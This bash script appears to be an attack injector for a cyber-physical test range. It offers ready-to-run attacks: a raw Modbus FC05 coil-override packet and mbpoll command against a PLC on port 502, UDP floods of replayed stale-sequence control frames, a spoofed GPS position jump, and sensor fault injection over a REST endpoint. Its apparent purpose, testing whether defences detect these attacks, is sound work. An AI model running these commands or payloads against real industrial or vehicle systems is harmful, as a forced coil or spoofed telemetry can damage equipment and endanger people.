#!/usr/bin/env bash
# ==============================================================================
# 05_inject_adversary_attacks.sh — Multi-Vector Cyber-Physical Attack Injector
# ==============================================================================
set -euo pipefail

ATTACK_TYPE="${1:-help}"
CYAN="\033[1;36m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"

case "${ATTACK_TYPE}" in
    modbus|scada|coil)
        TARGET_IP="${2:-10.240.0.101}"
        echo -e "${RED}[!] Injecting Unauthorized Modbus FC05 Coil Override -> ${TARGET_IP}:502...${RESET}"
        docker exec matrix-adversary mbpoll -m tcp -a 1 -r 109 -t 0 "${TARGET_IP}" 1 2>/dev/null || \
            python3 -c "
import socket
s = socket.socket()
s.connect(('${TARGET_IP}', 502))
s.send(b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x6d\xff\x00')
print('[+] Dispatched raw Modbus FC05 payload.')
"
        ;;
    replay|stanag-replay)
        TARGET_IP="${2:-10.240.52.121}"
        echo -e "${RED}[!] Blasting Stale Sequence Replay (Seq=100) -> ${TARGET_IP}:50050/udp...${RESET}"
        python3 -c "
import socket, struct, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
now_us = int(time.time() * 1e6)
# Stale sequence counter 100
pkt = struct.pack('>HIIQHfff', 0x1001, 1, 100, now_us, 12, 0.0, 80.0, 120.0)
for _ in range(50):
    s.sendto(pkt, ('${TARGET_IP}', 50050))
print('[+] Blasted 50 duplicate replay frames. Check container log for KERNEL_DROP.')
"
        ;;
    gps|teleport)
        TARGET_IP="${2:-10.240.52.123}"
        echo -e "${RED}[!] Injecting 5-Kilometer GPS Coordinate Teleportation -> ${TARGET_IP}:50050/udp...${RESET}"
        python3 -c "
import socket, struct, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
now_us = int(time.time() * 1e6)
# Impossible coordinate jump: X=5000m, Y=5000m, Z=800m (ΔV > 400 m/s)
pkt = struct.pack('>HIIQHfff', 0x1001, 2, 99999, now_us, 12, 5000.0, 5000.0, 800.0)
s.sendto(pkt, ('${TARGET_IP}', 50050))
print('[+] Dispatched GPS teleportation jump. Check container for Actuator Air-Gap Trip.')
"
        ;;
    sensor-spike)
        SENSOR_ID="${2:-ALPHA_S023_GNSS}"
        TARGET_IP="${3:-10.240.52.141}"
        echo -e "${YELLOW}[!] Spiking physical sensor ${SENSOR_ID} via REST endpoint http://${TARGET_IP}:8088/fault...${RESET}"
        curl -s -X POST "http://${TARGET_IP}:8088/fault" \
             -H "Content-Type: application/json" \
             -d "{\"sensor_id\":\"${SENSOR_ID}\",\"action\":\"spike\"}"
        echo -e "\n${GREEN}[+] Sensor spiked. Verify in Mission Control ECharts waveform.${RESET}"
        ;;
    sensor-reset)
        SENSOR_ID="${2:-ALPHA_S023_GNSS}"
        TARGET_IP="${3:-10.240.52.141}"
        echo -e "${GREEN}[+] Restoring sensor ${SENSOR_ID} to nominal baseline...${RESET}"
        curl -s -X POST "http://${TARGET_IP}:8088/fault" \
             -H "Content-Type: application/json" \
             -d "{\"sensor_id\":\"${SENSOR_ID}\",\"action\":\"reset\"}"
        echo -e "\n${GREEN}[+] Sensor baseline restored.${RESET}"
        ;;
    *)
        echo -e "Usage: $0 <attack_type> [target_ip]"
        echo -e "  modbus        : Force coil override against industrial PLC (port 502)"
        echo -e "  replay        : Blast stale NATO STANAG 4586 sequence replay packets"
        echo -e "  gps           : Inject 5km GPS teleportation jump to trip actuator air-gap"
        echo -e "  sensor-spike  : Inject physical telemetry spike into a specific sensor container (:8088)"
        echo -e "  sensor-reset  : Restore physical sensor to baseline"
        exit 1
        ;;
esac
